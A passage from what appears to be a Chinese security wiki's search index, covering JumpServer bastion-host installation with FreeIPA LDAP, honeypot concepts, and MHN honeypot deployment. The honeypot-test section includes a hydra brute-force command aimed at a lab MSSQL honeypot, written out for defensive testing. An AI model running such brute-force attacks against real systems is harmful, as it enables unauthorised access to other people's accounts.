-m venv py3 source /opt/py3/bin/activate # \u81ea\u52a8\u8f7d\u5165python\u865a\u62df\u73af\u5883\u914d\u7f6e\uff08\u4e2a\u4eba\u89c9\u5f97\u6ca1\u6709\u5fc5\u8981\uff09 \u5b89\u88c5Jumpserver git clone https://github.com/jumpserver/jumpserver.git # \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 cd /opt/jumpserver/requirements yum install $(cat rpm_requirements.txt) -y # rpm\u5305\u4f9d\u8d56 pip install --upgrade pip setuptools pip install -r requirements.txt # python\u5e93\u4f9d\u8d56 # \u5b89\u88c5Redis yum install redis.x86_64 -y systemctl start redis.service # \u5b89\u88c5MySQL yum install mariadb-devel.x86_64 mariadb-libs.x86_64 mariadb-server.x86_64 mariadb.x86_64 -y # \u914d\u7f6e\u6570\u636e\u5e93 # \u6570\u636e\u5e93\uff1ajumpserver create database jumpserver default charset 'utf8'; # \u4fee\u6539jumpserver\u914d\u7f6e\u6587\u4ef6 cd /opt/jumpserver/ cp config_example.py config.py # \u4fee\u6539\u6570\u636e\u5e93\u90e8\u5206\uff0c\u6309\u7167\u5b98\u7f51\u6765\u8fdb\u884c\u4fee\u6539 # \u521d\u59cb\u5316\u6570\u636e\u5e93 cd /opt/jumpserver/utils/ bash make_migrations.sh # \u8fd0\u884cJumpserver cd /opt/jumpserver ./jms start all # \u540e\u53f0\u8fd0\u884c\u6307\u5b9a-d\u53c2\u6570 # \u8bbf\u95ee\uff1aadmin/admin # \u6211\u8fd9\u91cc\u56e0\u4e3ajumpserver\u548cfreeipa\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u4e3a\u4e86\u79ef\u6781\u7aef\u53e3\u51b2\u7a81\uff0c\u6211\u4fee\u6539\u4e3a8888\u7aef\u53e3 \u5907\u6ce8\uff1a\u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u8bf4\u660e # \u6d4b\u8bd5\u4f7f\u7528\u53ef\u4ee5\u53ea\u4fee\u6539\u6570\u636e\u5e93\u914d\u7f6e\u90e8\u5206 # \u751f\u4ea7\u4f7f\u7528\u9700\u8981\u914d\u7f6e\u4ee5\u4e0b\u53c2\u6570\uff1a SECRET_KEY = '****' BOOTSTRAP_TOKEN = '*****' \u5b89\u88c5SSH Server \u548c WebSocket Server # \u6fc0\u6d3bpython3\u73af\u5883 cd /opt git clone https://github.com/jumpserver/coco.git # \u5b89\u88c5\u4f9d\u8d56 cd /opt/coco/requirements/ yum install $(cat rpm_requirements.txt) -y pip install -r requirements.txt # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 cd /opt/coco mkdir keys logs cp conf_example.py conf.py vim conf.py # \u6309\u7167\u5b98\u7f51\u8fdb\u884c\u914d\u7f6e # \u8fd9\u91cc\u7684BOOTSTRAP_TOKEN\u8bb0\u5f97\u4e0ejumpserver\u7684BOOTSTRAP_TOKEN\u4e00\u81f4 # \u4e00\u5b9a\u8981\u4fee\u6539jumpserver\u7684\u5730\u5740 # \u542f\u52a8 cd /opt/coco/ ./cocod start # -d \u540e\u53f0\u8fd0\u884c # \u505c\u6b62\u4efb\u52a1 ./cocod stop # \u8bbf\u95eejumpserver\u63a5\u53d7coco\u6ce8\u518c\uff1a\u4f1a\u8bdd\u7ba1\u7406-\u7ec8\u7aef\u7ba1\u7406 # \u6d4b\u8bd5coco ssh -p 2222 admin@ipa.bloodzer0.com # \u5bc6\u7801\u5c31\u662fadmin\u7684\u5bc6\u7801 \u914d\u7f6e\u5f00\u673a\u81ea\u542f jumpserver sed -i s/START_TIMEOUT = 15/START_TIMEOUT = 40/g /opt/jumpserver/jms vim /usr/lib/systemd/system/jms.service [Unit] Description=jms After=network.target mariadb.service redis.service [Service] Type=forking Environment= PATH=/opt/py3/bin ExecStart=/opt/jumpserver/jms start all -d ExecReload= ExecStop=/opt/jumpserver/jms stop [Install] WantedBy=multi-user.target coco vim /usr/lib/systemd/system/coco.service [Unit] Description=coco After=network.target jms.service [Service] Type=forking Environment= PATH=/opt/py3/bin ExecStart=/opt/coco/cocod start -d ExecReload= ExecStop=/opt/coco/cocod stop [Install] WantedBy=multi-user.target \u7cfb\u7edf\u4f7f\u7528 \u7528\u6237\u7ba1\u7406 \u521b\u5efa\u7ba1\u7406\u7528\u6237\uff1a\u7ba1\u7406\u7528\u6237\u662f\u670d\u52a1\u5668\u7684 root,\u6216\u62e5\u6709 NOPASSWD: ALL sudo \u6743\u9650\u7684\u7528\u6237,Jumpserver \u4f7f\u7528\u8be5\u7528\u6237\u6765\u63a8\u9001\u7cfb\u7edf\u7528\u6237\u3001\u83b7\u53d6\u8d44\u4ea7\u786c\u4ef6\u4fe1\u606f\u7b49\u3002 \u521b\u5efa\u7cfb\u7edf\u7528\u6237\uff1a\u521b\u5efa\u4e00\u4e2a\u7cfb\u7edf\u7528\u6237\uff1a\u7cfb\u7edf\u7528\u6237\u662f Jumpserver \u8df3\u8f6c\u767b\u5f55\u8d44\u4ea7\u65f6\u4f7f\u7528\u7684\u7528\u6237,\u53ef\u4ee5\u7406\u89e3\u4e3a\u767b\u5f55\u8d44\u4ea7\u7528\u6237,\u5982 web, sa, dba\u3002\uff08\u6b64\u7528\u6237\u9700\u8981\u5728\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u65f6\u5019\u5b89\u88c5\u597d\uff09 \u6dfb\u52a0\u666e\u901a\u7528\u6237\uff1a\u6b64\u7528\u6237\u7528\u4e8e\u767b\u5f55jumpserver LDAP\u914d\u7f6e freeipa\u5b89\u88c5 \u76f4\u63a5\u901a\u8fc7\u754c\u9762\u914d\u7f6e\uff1a\u7cfb\u7edf\u8bbe\u7f6e-LDAP\u8bbe\u7f6e LDAP\u5730\u5740\uff1aldap://ipa.bloodzer0.com:389 \u7ed1\u5b9aDN\uff1acn=users,cn=accounts,dc=bloodzer0,dc=com \u5bc6\u7801\uff1a# \u4f60\u8bbe\u7f6e\u7684LDAP\u5bc6\u7801 \u7528\u6237OU\uff1acn=users,cn=accounts,dc=bloodzer0,dc=com \u7528\u6237\u8fc7\u6ee4\u5668\uff1a(uid=%(user)s) LDAP\u5c5e\u6027\u6620\u5c04\uff1a{ username : uid , name : cn , email : mail } \u5728freeipa\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u7528\u6237\u5373\u4f7f\u7528\u8be5\u7528\u6237\u8fdb\u884cjumpserver\u8ba4\u8bc1\u3002","title":"jumpserver \u5f00\u6e90\u5821\u5792\u673a"},{"location":"infrastructure-security/host-security/fortress-machine/jumpserver/#jumpserver","text":"\u5b98\u7f51\u5730\u5740","title":"jumpserver \u5f00\u6e90\u5821\u5792\u673a"},{"location":"infrastructure-security/host-security/fortress-machine/jumpserver/#_1","text":"\u5b98\u65b9\u5b89\u88c5\u6587\u6863","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"infrastructure-security/host-security/fortress-machine/jumpserver/#centos7jumpserver","text":"# \u5173\u95ed\u9632\u706b\u5899\u4e0eSELinux systemctl disable firewalld.service systemctl stop firewalld.service vim /etc/selinux/config # \u4fee\u6539\u5b57\u7b26\u96c6\uff0c\u5426\u5219\u53ef\u80fd\u62a5 input/output error\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u65e5\u5fd7\u91cc\u6253\u5370\u4e86\u4e2d\u6587\u3002 localedef -c -f UTF-8 -i zh_CN zh_CN.UTF-8 export LC_ALL=zh_CN.UTF-8 echo 'LANG= zh_CN.UTF-8 ' /etc/locale.conf \u51c6\u5907python3\u548c\u865a\u62df\u73af\u5883 yum install epel-release gcc.x86_64 -y yum install python36.x86_64 python36-devel.x86_64 -y # \u5efa\u7acbpython\u865a\u62df\u73af\u5883 cd /opt/ python3.6 -m venv py3 source /opt/py3/bin/activate # \u81ea\u52a8\u8f7d\u5165python\u865a\u62df\u73af\u5883\u914d\u7f6e\uff08\u4e2a\u4eba\u89c9\u5f97\u6ca1\u6709\u5fc5\u8981\uff09 \u5b89\u88c5Jumpserver git clone https://github.com/jumpserver/jumpserver.git # \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 cd /opt/jumpserver/requirements yum install $(cat rpm_requirements.txt) -y # rpm\u5305\u4f9d\u8d56 pip install --upgrade pip setuptools pip install -r requirements.txt # python\u5e93\u4f9d\u8d56 # \u5b89\u88c5Redis yum install redis.x86_64 -y systemctl start redis.service # \u5b89\u88c5MySQL yum install mariadb-devel.x86_64 mariadb-libs.x86_64 mariadb-server.x86_64 mariadb.x86_64 -y # \u914d\u7f6e\u6570\u636e\u5e93 # \u6570\u636e\u5e93\uff1ajumpserver create database jumpserver default charset 'utf8'; # \u4fee\u6539jumpserver\u914d\u7f6e\u6587\u4ef6 cd /opt/jumpserver/ cp config_example.py config.py # \u4fee\u6539\u6570\u636e\u5e93\u90e8\u5206\uff0c\u6309\u7167\u5b98\u7f51\u6765\u8fdb\u884c\u4fee\u6539 # \u521d\u59cb\u5316\u6570\u636e\u5e93 cd /opt/jumpserver/utils/ bash make_migrations.sh # \u8fd0\u884cJumpserver cd /opt/jumpserver ./jms start all # \u540e\u53f0\u8fd0\u884c\u6307\u5b9a-d\u53c2\u6570 # \u8bbf\u95ee\uff1aadmin/admin # \u6211\u8fd9\u91cc\u56e0\u4e3ajumpserver\u548cfreeipa\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u4e3a\u4e86\u79ef\u6781\u7aef\u53e3\u51b2\u7a81\uff0c\u6211\u4fee\u6539\u4e3a8888\u7aef\u53e3 \u5907\u6ce8\uff1a\u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u8bf4\u660e # \u6d4b\u8bd5\u4f7f\u7528\u53ef\u4ee5\u53ea\u4fee\u6539\u6570\u636e\u5e93\u914d\u7f6e\u90e8\u5206 # \u751f\u4ea7\u4f7f\u7528\u9700\u8981\u914d\u7f6e\u4ee5\u4e0b\u53c2\u6570\uff1a SECRET_KEY = '****' BOOTSTRAP_TOKEN = '*****'","title":"Centos7\u5b89\u88c5Jumpserver"},{"location":"infrastructure-security/host-security/fortress-machine/jumpserver/#ssh-server-websocket-server","text":"# \u6fc0\u6d3bpython3\u73af\u5883 cd /opt git clone https://github.com/jumpserver/coco.git # \u5b89\u88c5\u4f9d\u8d56 cd /opt/coco/requirements/ yum install $(cat rpm_requirements.txt) -y pip install -r requirements.txt # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 cd /opt/coco mkdir keys logs cp conf_example.py conf.py vim conf.py # \u6309\u7167\u5b98\u7f51\u8fdb\u884c\u914d\u7f6e # \u8fd9\u91cc\u7684BOOTSTRAP_TOKEN\u8bb0\u5f97\u4e0ejumpserver\u7684BOOTSTRAP_TOKEN\u4e00\u81f4 # \u4e00\u5b9a\u8981\u4fee\u6539jumpserver\u7684\u5730\u5740 # \u542f\u52a8 cd /opt/coco/ ./cocod start # -d \u540e\u53f0\u8fd0\u884c # \u505c\u6b62\u4efb\u52a1 ./cocod stop # \u8bbf\u95eejumpserver\u63a5\u53d7coco\u6ce8\u518c\uff1a\u4f1a\u8bdd\u7ba1\u7406-\u7ec8\u7aef\u7ba1\u7406 # \u6d4b\u8bd5coco ssh -p 2222 admin@ipa.bloodzer0.com # \u5bc6\u7801\u5c31\u662fadmin\u7684\u5bc6\u7801","title":"\u5b89\u88c5SSH Server \u548c WebSocket Server"},{"location":"infrastructure-security/host-security/fortress-machine/jumpserver/#_2","text":"jumpserver sed -i s/START_TIMEOUT = 15/START_TIMEOUT = 40/g /opt/jumpserver/jms vim /usr/lib/systemd/system/jms.service [Unit] Description=jms After=network.target mariadb.service redis.service [Service] Type=forking Environment= PATH=/opt/py3/bin ExecStart=/opt/jumpserver/jms start all -d ExecReload= ExecStop=/opt/jumpserver/jms stop [Install] WantedBy=multi-user.target coco vim /usr/lib/systemd/system/coco.service [Unit] Description=coco After=network.target jms.service [Service] Type=forking Environment= PATH=/opt/py3/bin ExecStart=/opt/coco/cocod start -d ExecReload= ExecStop=/opt/coco/cocod stop [Install] WantedBy=multi-user.target","title":"\u914d\u7f6e\u5f00\u673a\u81ea\u542f"},{"location":"infrastructure-security/host-security/fortress-machine/jumpserver/#_3","text":"\u7528\u6237\u7ba1\u7406 \u521b\u5efa\u7ba1\u7406\u7528\u6237\uff1a\u7ba1\u7406\u7528\u6237\u662f\u670d\u52a1\u5668\u7684 root,\u6216\u62e5\u6709 NOPASSWD: ALL sudo \u6743\u9650\u7684\u7528\u6237,Jumpserver \u4f7f\u7528\u8be5\u7528\u6237\u6765\u63a8\u9001\u7cfb\u7edf\u7528\u6237\u3001\u83b7\u53d6\u8d44\u4ea7\u786c\u4ef6\u4fe1\u606f\u7b49\u3002 \u521b\u5efa\u7cfb\u7edf\u7528\u6237\uff1a\u521b\u5efa\u4e00\u4e2a\u7cfb\u7edf\u7528\u6237\uff1a\u7cfb\u7edf\u7528\u6237\u662f Jumpserver \u8df3\u8f6c\u767b\u5f55\u8d44\u4ea7\u65f6\u4f7f\u7528\u7684\u7528\u6237,\u53ef\u4ee5\u7406\u89e3\u4e3a\u767b\u5f55\u8d44\u4ea7\u7528\u6237,\u5982 web, sa, dba\u3002\uff08\u6b64\u7528\u6237\u9700\u8981\u5728\u7cfb\u7edf\u521d\u59cb\u5316\u7684\u65f6\u5019\u5b89\u88c5\u597d\uff09 \u6dfb\u52a0\u666e\u901a\u7528\u6237\uff1a\u6b64\u7528\u6237\u7528\u4e8e\u767b\u5f55jumpserver","title":"\u7cfb\u7edf\u4f7f\u7528"},{"location":"infrastructure-security/host-security/fortress-machine/jumpserver/#ldap","text":"freeipa\u5b89\u88c5 \u76f4\u63a5\u901a\u8fc7\u754c\u9762\u914d\u7f6e\uff1a\u7cfb\u7edf\u8bbe\u7f6e-LDAP\u8bbe\u7f6e LDAP\u5730\u5740\uff1aldap://ipa.bloodzer0.com:389 \u7ed1\u5b9aDN\uff1acn=users,cn=accounts,dc=bloodzer0,dc=com \u5bc6\u7801\uff1a# \u4f60\u8bbe\u7f6e\u7684LDAP\u5bc6\u7801 \u7528\u6237OU\uff1acn=users,cn=accounts,dc=bloodzer0,dc=com \u7528\u6237\u8fc7\u6ee4\u5668\uff1a(uid=%(user)s) LDAP\u5c5e\u6027\u6620\u5c04\uff1a{ username : uid , name : cn , email : mail } \u5728freeipa\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u7528\u6237\u5373\u4f7f\u7528\u8be5\u7528\u6237\u8fdb\u884cjumpserver\u8ba4\u8bc1\u3002","title":"LDAP\u914d\u7f6e"},{"location":"infrastructure-security/host-security/honeypot/","text":"\u871c\u7f50\u6280\u672f \u871c\u7f50\u53ef\u4ee5\u5b58\u5728\u4e8e\u5404\u79cd\u573a\u666f\u4e4b\u4e2d\uff08\u673a\u623f\u3001\u5185\u7f51\u3001\u4e91\u73af\u5883\uff09\uff1b \u871c\u7f50\u4ea7\u54c1\u7684\u601d\u8003\u5e94\u8be5\u662f\u5728\u9632\u706b\u5899\u3001\u5165\u4fb5\u68c0\u6d4b\u4e4b\u540e\uff0c\u5c5e\u4e8e\u63d0\u9ad8\u4f01\u4e1a\u5b89\u5168\u6c34\u5e73\u7684\u8f85\u52a9\u4ea7\u54c1\uff1b \u871c\u7f50\u4e3b\u8981\u90e8\u7f72\u5728\u4f01\u4e1a\u5185\u7f51\uff0c\u8d77\u5230\u9884\u8b66\u4e0e\u4e86\u89e3\u653b\u51fb\u4e2d\u5165\u4fb5\u7684\u60c5\u51b5\u7684\u4f5c\u7528\uff0c\u5982\uff1a\u53d1\u73b0\u5458\u5de5PC\u4e2d\u6bd2\u5bf9\u5185\u7f51\u7684\u5165\u4fb5\u3001\u8f6c\u79fb\u653b\u51fb\u8005\u6ce8\u610f\u529b\u7b49\u7b49\uff1b \u871c\u7f50\u4e0d\u80fd\u8bbe\u7f6e\u7684\u592a\u8fc7\u7b80\u5355\uff0c\u4e5f\u4e0d\u80fd\u8bbe\u7f6e\u592a\u8fc7\u590d\u6742\uff1b \u53c2\u8003\u8d44\u6599 \u5b89\u5168\u51b3\u7b56\u96be\u9898\uff1a\u90e8\u7f72\u871c\u7f50\u65f6\u9700\u8981\u505a\u51fa\u7684\u5341\u9879\u91cd\u8981\u5224\u65ad 10 decisions you'll face when deploying a honeypot \u4e3a\u4ec0\u4e48\u8fd9\u4e48\u591a\u521b\u4e1a\u516c\u53f8\u90fd\u5728\u505a\u201c\u871c\u7f50\u201d\uff1f\u4e5f\u8bb8\u8fd9\u7bc7\u6587\u7ae0\u80fd\u544a\u8bc9\u4f60 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u2014\u6a21\u5757\u5316\u871c\u7f50\u5e73\u53f0\u7684\u8bbe\u8ba1\u601d\u8def\u4e0e\u60f3\u6cd5 \u91d1\u878d\u884c\u4e1a\u5fae\u871c\u7f50\u7cfb\u7edf\u5e94\u7528\u601d\u8003","title":"\u871c\u7f50\u6280\u672f"},{"location":"infrastructure-security/host-security/honeypot/#_1","text":"\u871c\u7f50\u53ef\u4ee5\u5b58\u5728\u4e8e\u5404\u79cd\u573a\u666f\u4e4b\u4e2d\uff08\u673a\u623f\u3001\u5185\u7f51\u3001\u4e91\u73af\u5883\uff09\uff1b \u871c\u7f50\u4ea7\u54c1\u7684\u601d\u8003\u5e94\u8be5\u662f\u5728\u9632\u706b\u5899\u3001\u5165\u4fb5\u68c0\u6d4b\u4e4b\u540e\uff0c\u5c5e\u4e8e\u63d0\u9ad8\u4f01\u4e1a\u5b89\u5168\u6c34\u5e73\u7684\u8f85\u52a9\u4ea7\u54c1\uff1b \u871c\u7f50\u4e3b\u8981\u90e8\u7f72\u5728\u4f01\u4e1a\u5185\u7f51\uff0c\u8d77\u5230\u9884\u8b66\u4e0e\u4e86\u89e3\u653b\u51fb\u4e2d\u5165\u4fb5\u7684\u60c5\u51b5\u7684\u4f5c\u7528\uff0c\u5982\uff1a\u53d1\u73b0\u5458\u5de5PC\u4e2d\u6bd2\u5bf9\u5185\u7f51\u7684\u5165\u4fb5\u3001\u8f6c\u79fb\u653b\u51fb\u8005\u6ce8\u610f\u529b\u7b49\u7b49\uff1b \u871c\u7f50\u4e0d\u80fd\u8bbe\u7f6e\u7684\u592a\u8fc7\u7b80\u5355\uff0c\u4e5f\u4e0d\u80fd\u8bbe\u7f6e\u592a\u8fc7\u590d\u6742\uff1b","title":"\u871c\u7f50\u6280\u672f"},{"location":"infrastructure-security/host-security/honeypot/#_2","text":"\u5b89\u5168\u51b3\u7b56\u96be\u9898\uff1a\u90e8\u7f72\u871c\u7f50\u65f6\u9700\u8981\u505a\u51fa\u7684\u5341\u9879\u91cd\u8981\u5224\u65ad 10 decisions you'll face when deploying a honeypot \u4e3a\u4ec0\u4e48\u8fd9\u4e48\u591a\u521b\u4e1a\u516c\u53f8\u90fd\u5728\u505a\u201c\u871c\u7f50\u201d\uff1f\u4e5f\u8bb8\u8fd9\u7bc7\u6587\u7ae0\u80fd\u544a\u8bc9\u4f60 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u2014\u6a21\u5757\u5316\u871c\u7f50\u5e73\u53f0\u7684\u8bbe\u8ba1\u601d\u8def\u4e0e\u60f3\u6cd5 \u91d1\u878d\u884c\u4e1a\u5fae\u871c\u7f50\u7cfb\u7edf\u5e94\u7528\u601d\u8003","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/","text":"MHN\u871c\u7f50 MHN\uff08Modern Honey Network\uff09\uff1a\u5f00\u6e90\u871c\u7f50\uff0c\u7b80\u5316\u871c\u7f50\u7684\u90e8\u7f72\uff0c\u540c\u65f6\u4fbf\u4e8e\u6536\u96c6\u548c\u7edf\u8ba1\u871c\u7f50\u7684\u6570\u636e\u3002\u7528ThreatStream\u6765\u90e8\u7f72\uff0c\u6570\u636e\u5b58\u50a8\u5728MOngoDB\u4e2d\uff0c\u5b89\u88c5\u4e86\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u7684\u90e8\u7f72\u4f20\u611f\u5668Snort\u3001Kippo\u3001Conpot\u548cDionaea\u3002\u6536\u96c6\u7684\u4fe1\u606f\u53ef\u4ee5\u901a\u8fc7Web\u63a5\u53e3\u8fdb\u884c\u5c55\u793a\u3002 github\u5730\u5740 \u652f\u6301\u871c\u7f50\u7c7b\u578b Snort Suricata Dionaea Conpot Kippo Amun Glastopf WordPot ShaockPot P0f MHN\u67b6\u6784 MHN\u5b89\u88c5\u4e0e\u4f7f\u7528 Ubuntu\u5b89\u88c5MHN # \u64cd\u4f5c\u7cfb\u7edf\uff1aubuntu16.04 # \u4e0b\u8f7d git clone https://github.com/threatstream/mhn.git # \u5b89\u88c5\u8fc7\u7a0b\u6709\u70b9\u4e45\uff0c\u9700\u8981\u5b89\u88c5\u5f88\u591a\u8f6f\u4ef6\u5305 cd mhn sudo ./install.sh # \u914d\u7f6e\u670d\u52a1\u5668\u4fe1\u606f\uff0c\u8fd9\u91cc\u7684\u90ae\u7bb1\u4e0e\u5bc6\u7801\u5c31\u662f\u5b89\u88c5\u5b8c\u6210\u540e\u7684Web\u540e\u53f0\u5bc6\u7801 # \u914d\u7f6esplunk\u4e0eELK\uff0c\u6211\u8fd9\u91cc\u9009\u62e9\u4e0d\u914d\u7f6e MHN\u914d\u7f6e \u90e8\u7f72\u871c\u7f50 \u5728Deploy\u9009\u9879\u4e2d\uff0c\u9009\u62e9\u6211\u4eec\u9700\u8981\u90e8\u7f72\u7684\u871c\u7f50\u7c7b\u578b\uff0c\u590d\u5236\u90e8\u7f72\u811a\u672c\u8fdb\u884c\u5b89\u88c5\u3002 \u96c6\u6210Splunk\u4e0eArcSight cd mhn/scripts/ sudo ./install_hpfeeds-logger-splunk.sh sudo ./install_hpfeeds-logger-arcsight.sh tail -f /var/log/mhn/mhn-splunk.log tail -f /var/log/mhn/mhn-arcsight.log \u7981\u6b62\u6570\u636e\u4e0a\u62a5 MHN Server\u4f1a\u9ed8\u8ba4\u5c06\u5206\u6790\u6570\u636e\u4e0a\u62a5\u7ed9Anomali\uff0c\u5982\u679c\u9700\u8981\u7981\u7528\u6b64\u914d\u7f6e\uff0c\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\uff1a cd mhn/scripts/ sudo ./disable_collector.sh \u5229\u7528MHN\u90e8\u7f72\u871c\u7f50 \u871c\u7f50\u6d4b\u8bd5 # \u871c\u7f50\u90e8\u7f72\u673a\u5668\uff1a10.10.10.5 # \u90e8\u7f72\u871c\u7f50\uff1adionaea wget http://10.10.10.8/api/script/?text=true script_id=4 -O deploy.sh sudo bash deploy.sh http://10.10.10.8 pp8D4gPI # \u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u653b\u51fb hydra -l root -P password.txt mssql://10.10.10.5 \u5fc3\u5f97\u4f53\u4f1a \u4f18\u70b9 \u5185\u7f6e\u96c6\u6210\u5927\u91cf\u7684\u871c\u7f50\u7cfb\u7edf\uff0c\u4e14\u63d0\u4f9b\u4e00\u952e\u90e8\u7f72\u871c\u7f50\u7684\u65b9\u5f0f\uff1b \u652f\u6301\u871c\u7f50\u653b\u51fb\u6548\u679c\u56fe\u5c55\u793a\uff0c\u4e0eArcSight\u6216Splunk\u96c6\u6210\u53cb\u597d\uff1b \u7f3a\u70b9 \u90e8\u7f72\u65f6\u95f4\u9700\u8981\u5f88\u957f\u65f6\u95f4\uff08\u4e0d\u7b97\u7f3a\u70b9\u5427\uff0c\u7f51\u901f\u7ed9\u529b\u60c5\u51b5\u4e0b\u4e0d\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\uff09\uff1b \u4e0d\u652f\u6301\u5bf9\u871c\u7f50\u7684\u96c6\u4e2d\u7ba1\u7406\uff1b \u53c2\u8003\u8d44\u6599 Build Your Own Honeypot Network In Under An Hour","title":"MHN\u871c\u7f50"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#mhn","text":"MHN\uff08Modern Honey Network\uff09\uff1a\u5f00\u6e90\u871c\u7f50\uff0c\u7b80\u5316\u871c\u7f50\u7684\u90e8\u7f72\uff0c\u540c\u65f6\u4fbf\u4e8e\u6536\u96c6\u548c\u7edf\u8ba1\u871c\u7f50\u7684\u6570\u636e\u3002\u7528ThreatStream\u6765\u90e8\u7f72\uff0c\u6570\u636e\u5b58\u50a8\u5728MOngoDB\u4e2d\uff0c\u5b89\u88c5\u4e86\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u7684\u90e8\u7f72\u4f20\u611f\u5668Snort\u3001Kippo\u3001Conpot\u548cDionaea\u3002\u6536\u96c6\u7684\u4fe1\u606f\u53ef\u4ee5\u901a\u8fc7Web\u63a5\u53e3\u8fdb\u884c\u5c55\u793a\u3002 github\u5730\u5740","title":"MHN\u871c\u7f50"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#_1","text":"Snort Suricata Dionaea Conpot Kippo Amun Glastopf WordPot ShaockPot P0f","title":"\u652f\u6301\u871c\u7f50\u7c7b\u578b"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#mhn_1","text":"","title":"MHN\u67b6\u6784"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#mhn_2","text":"","title":"MHN\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#ubuntumhn","text":"# \u64cd\u4f5c\u7cfb\u7edf\uff1aubuntu16.04 # \u4e0b\u8f7d git clone https://github.com/threatstream/mhn.git # \u5b89\u88c5\u8fc7\u7a0b\u6709\u70b9\u4e45\uff0c\u9700\u8981\u5b89\u88c5\u5f88\u591a\u8f6f\u4ef6\u5305 cd mhn sudo ./install.sh # \u914d\u7f6e\u670d\u52a1\u5668\u4fe1\u606f\uff0c\u8fd9\u91cc\u7684\u90ae\u7bb1\u4e0e\u5bc6\u7801\u5c31\u662f\u5b89\u88c5\u5b8c\u6210\u540e\u7684Web\u540e\u53f0\u5bc6\u7801 # \u914d\u7f6esplunk\u4e0eELK\uff0c\u6211\u8fd9\u91cc\u9009\u62e9\u4e0d\u914d\u7f6e","title":"Ubuntu\u5b89\u88c5MHN"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#mhn_3","text":"\u90e8\u7f72\u871c\u7f50 \u5728Deploy\u9009\u9879\u4e2d\uff0c\u9009\u62e9\u6211\u4eec\u9700\u8981\u90e8\u7f72\u7684\u871c\u7f50\u7c7b\u578b\uff0c\u590d\u5236\u90e8\u7f72\u811a\u672c\u8fdb\u884c\u5b89\u88c5\u3002 \u96c6\u6210Splunk\u4e0eArcSight cd mhn/scripts/ sudo ./install_hpfeeds-logger-splunk.sh sudo ./install_hpfeeds-logger-arcsight.sh tail -f /var/log/mhn/mhn-splunk.log tail -f /var/log/mhn/mhn-arcsight.log \u7981\u6b62\u6570\u636e\u4e0a\u62a5 MHN Server\u4f1a\u9ed8\u8ba4\u5c06\u5206\u6790\u6570\u636e\u4e0a\u62a5\u7ed9Anomali\uff0c\u5982\u679c\u9700\u8981\u7981\u7528\u6b64\u914d\u7f6e\uff0c\u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\uff1a cd mhn/scripts/ sudo ./disable_collector.sh","title":"MHN\u914d\u7f6e"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#mhn_4","text":"","title":"\u5229\u7528MHN\u90e8\u7f72\u871c\u7f50"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#_2","text":"# \u871c\u7f50\u90e8\u7f72\u673a\u5668\uff1a10.10.10.5 # \u90e8\u7f72\u871c\u7f50\uff1adionaea wget http://10.10.10.8/api/script/?text=true script_id=4 -O deploy.sh sudo bash deploy.sh http://10.10.10.8 pp8D4gPI # \u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u653b\u51fb hydra -l root -P password.txt mssql://10.10.10.5","title":"\u871c\u7f50\u6d4b\u8bd5"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#_3","text":"","title":"\u5fc3\u5f97\u4f53\u4f1a"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#_4","text":"\u5185\u7f6e\u96c6\u6210\u5927\u91cf\u7684\u871c\u7f50\u7cfb\u7edf\uff0c\u4e14\u63d0\u4f9b\u4e00\u952e\u90e8\u7f72\u871c\u7f50\u7684\u65b9\u5f0f\uff1b \u652f\u6301\u871c\u7f50\u653b\u51fb\u6548\u679c\u56fe\u5c55\u793a\uff0c\u4e0eArcSight\u6216Splunk\u96c6\u6210\u53cb\u597d\uff1b","title":"\u4f18\u70b9"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#_5","text":"\u90e8\u7f72\u65f6\u95f4\u9700\u8981\u5f88\u957f\u65f6\u95f4\uff08\u4e0d\u7b97\u7f3a\u70b9\u5427\uff0c\u7f51\u901f\u7ed9\u529b\u60c5\u51b5\u4e0b\u4e0d\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\uff09\uff1b \u4e0d\u652f\u6301\u5bf9\u871c\u7f50\u7684\u96c6\u4e2d\u7ba1\u7406\uff1b","title":"\u7f3a\u70b9"},{"location":"infrastructure-security/host-security/honeypot/mhn-honeypot/#_6","text":"Build Your Own Honeypot Network In Under An Hour","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/host-security/host-security-scan/","text":"\u4e3b\u673a\u5b89\u5168\u626b\u63cf 